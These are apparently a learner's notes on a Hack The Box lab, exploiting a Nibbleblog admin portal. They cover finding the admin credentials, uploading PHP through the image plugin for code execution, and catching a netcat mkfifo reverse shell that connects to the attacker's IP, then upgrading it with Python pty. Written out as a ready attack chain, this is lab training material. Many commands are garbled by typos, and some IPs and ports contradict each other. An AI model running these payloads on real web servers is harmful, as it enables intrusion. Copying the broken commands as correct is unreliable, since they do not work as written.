
Now that we are logged into the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the web server. We know a Metasploit module will likely wokr for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:


> [!note] admin portal
> Public: making a new post, video post, quote post, or new page
> Comments: shows no publish comments
> Manage: managing post, pages and categories.
> Settings: scrolling to the bottom confirms that the vulnerable version is in use.
> Themes: this allows us to install a new them from a pre selected list. 
> Plug-ins: allows us to configure, install, or uninstall plugins. 

Attempting to make a new page and embed code or upload files does not seem like the path. Let’s check the plugin page.

![Nibbleblog plugins page showing installed plugins: Categories, Hello world, Latest posts, My image, with options to configure or uninstall.](https://academy.hackthebox.com/storage/modules/77/plugins.png)
Let’s attempt to use this plufin to upload a snippet of PHP code instead of an image. The following snippet can be used to test for code execution. 
```
<?php system('id'); ?>
```
Save this code to a file and then click on the Browse button and upload it. 

To find out if the file was uploaded successfully, going back to the directory brute-forcing results, we remember the /content directory. Under this, there is a plugins directory and another subdirectory for my_omage. The full path is at http://<host>/nibbleblog/content/private/plugins/my) image/. In this directory, we see two files, db. Xml, and image. Php with  a recent last modfiied date, meaning that out upload was successful. Let usc heck and see if we can command execution. Following command
```
Curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
```

Looks like we hava gained remote code execution on the web server, and the apache server is running in the nibbler user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server. 
```
<? Php system (“rm /tmp/f; mkfifo /tmp/gf; cat /tmp/fl/bin/sh -i 2? &1|nc 10.10.14.2 9443 >/tmp/f”); ?>

```

This is adding our tun0 VPN IP address in the <Attacking IP> placeholder and a port of our choice for <LISTENING PORT> to catch the reverse shell on the netcat listener.

```
Nc -lvnp 9443
```
CURL the image page again or brwose to it in to execute the reverse shell.
Before we move forward with additional enumeration, let us upggrade our shell to a nicer shell since the shell that we caught is not a fuly intertactive TTY and specific commands such as su will not work, we can’t use text editors, tab-completion does not work, etc. For our purposes, we will use a Python one liner to spawn a pseudo terminal so commands such as su and sudo work as sidcussed previouslty in this module. 


```
Python -c import pty; pty. Spawn (bin/bash)
```
Trey the various techniques for upgrading to fa full TTY and pcik one that works the best for you. Out first attemp faisla s python2 seems to be missing from the system. 

```
$ python -c 'import pty; pty.Spawn ("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```
We have python3 though, which works to get us to a friendlier shell. Brwosing to /home/nibbler, we find the user. Txt flag as well as a zip file personal. Zip. 

```
nibbler@Nibbles :/home/nibbler$ ls

ls
personal.zip  user.txt
```

Gain a foothold on the target and submit the user. Txt flag
> [!note] 
> Start with the basic wget command, wget 10.129.141.185. 
> Nothing useful except that we just find out there is a index. Html file.
> By using cURL method, we can get that there is /nibbleblog/directory information. 
> Using firefox, we can get to access to the 10.129.141.185/nibbleblog
> 
> Now since we found the directory, let’s conduct the gobuster with following command
> Gobuster dir -u http://10.129.141.185 –wordlist /usr/share/dirb/wordlists/common.txt
> 
> (Hint: you can find the common. Txt by find / -type f -iname “common. Txt” 2>/dev/null
> 
> As the result of the gobuster, we can find several http status with 200 (ok) and 301 (redirect).
> Admin. Php, /content, /index. Php, /plugins, /READEME, /themes are the lists. 
> 
> When accessing /admin. Php using firefox, we need valid user id and the password. 
> Let’s go through the /content directory first. 
> There is a private folder, and then you can see users. Xml file. By using curl command, we can retrieve the data that the admin user name is admin. 
> Still no password information, but we can find Nibbles in config. Xml multiple times. This could be our password. And it works. 
> 
> After gaining the access, we can check we can upload files in the image plugin. We can upload following reverse shell one liner in to our php script. 
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
> We can edit this command into 
> Rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.129.141.185 9447 > /tmp/f
> listening on [any] 9443 ...
> connect to [10.10.15.115] from (UNKNOWN) [10.129.141.185] 52314
> /bin/sh: 0: can't access tty; job control turned off
> 
> 

